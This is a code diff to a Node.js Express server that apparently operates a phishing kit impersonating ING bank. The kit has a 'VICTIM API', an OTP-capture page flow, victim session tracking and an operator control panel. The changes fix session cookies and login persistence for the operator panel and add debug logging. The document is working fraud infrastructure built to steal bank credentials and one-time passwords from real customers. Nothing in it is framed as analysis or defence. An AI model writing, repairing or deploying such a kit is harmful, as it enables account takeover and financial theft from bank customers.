@@ -8,25 +8,27 @@ const session    = require('cookie-session');
 /* ----------  CONFIG  ---------- */
 const PANEL_USER     = process.env.PANEL_USER  || 'admin';
 const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
-const SESSION_SECRET = process.env.SESSION_SECRET || 'fallback-secret-change-me-in-production';
+const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
 
 const app  = express();
 const PORT = process.env.PORT || 3000;
 
-app.use(cors());
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true })); // Changed to true
-
-// Trust proxy for Cloudflare/Railway
+// Trust proxy - REQUIRED for sessions behind reverse proxy
 app.set('trust proxy', 1);
 
+app.use(cors());
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+
+// Session middleware - MUST be before routes
 app.use(session({
   name: 'pan_sess',
   keys: [SESSION_SECRET],
-  maxAge: 24 * 60 * 60 * 1000,
-  sameSite: 'none',
-  secure: true,
-  httpOnly: true
+  maxAge: 24 * 60 * 60 * 1000, // 24 hours
+  sameSite: 'lax',
+  secure: false, // Set to true if HTTPS only
+  httpOnly: true,
+  signed: true
 }));
 
 /* ----------  STATE  ---------- */
@@ -48,41 +50,52 @@ app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.
 app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
 app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));
 
-/* ----------  PANEL ACCESS  ---------- */
+/* ----------  PANEL ACCESS CONTROL  ---------- */
 
-// Block direct access to _panel.html
-app.get('/_panel.html', (req, res) => res.redirect('/panel'));
-
-// Main panel route - serves login or panel based on auth
+// Main panel route - handles both /panel and /panel?anything
 app.get('/panel', (req, res) => {
-  console.log('GET /panel - authed:', req.session?.authed); // Debug
-  if (req.session?.authed) {
+  console.log('Panel GET - authed:', req.session?.authed, 'query:', req.query);
+  
+  if (req.session?.authed === true) {
     return res.sendFile(__dirname + '/_panel.html');
   }
   res.sendFile(__dirname + '/access.html');
 });
 
-// Login handler
 app.post('/panel/login', (req, res) => {
   const { user, pw } = req.body;
-  console.log('Login attempt:', user, '- Expected:', PANEL_USER); // Debug
+  
+  console.log('Login attempt:', user, 'Query:', req.query);
   
   if (user === PANEL_USER && pw === PANEL_PASS) {
+    // Set session data
     req.session.authed = true;
     req.session.username = user;
-    console.log('Login success - redirecting to /panel'); // Debug
-    return res.redirect('/panel');
+    
+    console.log('Login successful, session before save:', req.session);
+    
+    // Explicitly save session
+    req.session.save((err) => {
+      if (err) {
+        console.error('Session save error:', err);
+        return res.redirect('/panel?fail=1');
+      }
+      console.log('Session saved, redirecting to panel');
+      return res.redirect('/panel');
+    });
+  } else {
+    console.log('Login failed - wrong credentials');
+    res.redirect('/panel?fail=1');
   }
-  
-  console.log('Login failed'); // Debug
-  res.redirect('/panel?error=1');
 });
 
-// Logout handler
 app.post('/panel/logout', (req, res) => {
   req.session = null;
   res.redirect('/panel');
 });
+
+// Block direct file access
+app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));
 
 /* ----------  DOMAIN HELPER  ---------- */
 app.use((req, res, next) => {
@@ -106,7 +119,6 @@ function uaParser(ua) {
   return u;
 }
 
-/* ----------  SESSION HEADER  ---------- */
 function getSessionHeader(v) {
   if (v.page === 'success') return `🦁 ING Login approved`;
   if (v.status === 'approved') return `🦁 ING Login approved`;
@@ -123,7 +135,6 @@ function getSessionHeader(v) {
   return `🔑 Awaiting OTP...`;
 }
 
-/* ----------  CLEANUP  ---------- */
 function cleanupSession(sid, reason, silent = false) {
   const v = sessionsMap.get(sid);
   if (!v) return;
@@ -139,7 +150,6 @@ setInterval(() => {
 }, 10000);
 
 /* ----------  VICTIM API  ---------- */
-
 app.post('/api/session', async (req, res) => {
   try {
     const sid = crypto.randomUUID();
@@ -337,8 +347,8 @@ app.post('/api/interaction', (req, res) => {
 });
 
 /* ----------  PANEL API  ---------- */
-
 app.get('/api/user', (req, res) => {
+  console.log('API User - session:', req.session);
   if (req.session?.authed) {
     return res.json({ username: req.session.username || PANEL_USER });
   }
@@ -346,6 +356,8 @@ app.get('/api/user', (req, res) => {
 });
 
 app.get('/api/panel', (req, res) => {
+  console.log('API Panel - authed:', req.session?.authed);
+  
   if (!req.session?.authed) {
     return res.status(401).json({ error: 'Not authenticated' });
   }
@@ -407,5 +419,6 @@ app.post('/api/panel', async (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
   console.log(`Panel user: ${PANEL_USER}`);
+  console.log(`Session secret: ${SESSION_SECRET.substring(0, 8)}...`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
